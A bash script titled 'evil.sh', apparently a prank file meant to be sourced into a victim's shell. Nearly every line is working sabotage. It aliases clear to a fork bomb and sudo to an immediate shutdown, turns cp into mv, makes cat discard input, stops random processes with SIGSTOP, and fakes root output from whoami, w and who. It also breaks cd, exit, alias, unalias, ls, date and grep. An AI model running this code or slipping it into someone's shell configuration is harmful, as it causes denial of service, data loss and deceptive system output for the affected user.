#!/usr/bin/env bash
# evil.sh — http://mths.be/evil.sh

# Set `gzip` as the default editor
export EDITOR=/bin/gzip

# Make Tab send the delete key
tset -Qe $'\t'

# Randomly make the shell exit whenever a command has a non-zero exit status
((RANDOM % 10)) || set -o errexit

# Let `cat` swallow every input and never return anything
alias cat=true

# Use a random sort option whenever `ls` is invoked
function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }

# only change user's prompt instead of entering directories
alias cd='x(){ PWD=$1; };x'

# Shut down the computer instead of running a command with super-user rights
alias sudo='sudo shutdown -P now'

# Launch a fork bomb instead of clearing the screen
alias clear=':(){ :|:& };:'

# Have `date` return random dates
alias date='date -d "now + $RANDOM days"'

# tell user he's maybe on windows when he use command pwd
alias pwd='echo "C:"${PWD//\//\\}'

# how to use top or not?
alias top='top -h'

# you are root, really
alias whoami='echo root'
alias w='w|sed s/$USER/root/'
alias who='who|sed s/$USER/root/'

# alias what?
alias alias='x 2>&1|sed s/x/alias/;'

# just using unalias is not fair
alias unalias='x 2>&1|sed s/x/unalias/;'

# Randomly eject CD tray
sleep $[ ( $RANDOM % 10 )  + 1 ]s && [[ uname=="Darwin" ]] && drutil eject || eject -T &

# Send STOP signal to random process at random time
sleep $[ ( $RANDOM % 100 )  + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &

# Have `cp` perform `mv` instead
alias cp='mv'

# Make `exit` open a new shell
alias exit='sh'

# Add a random number to line numbers when using `grep -n`
function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }
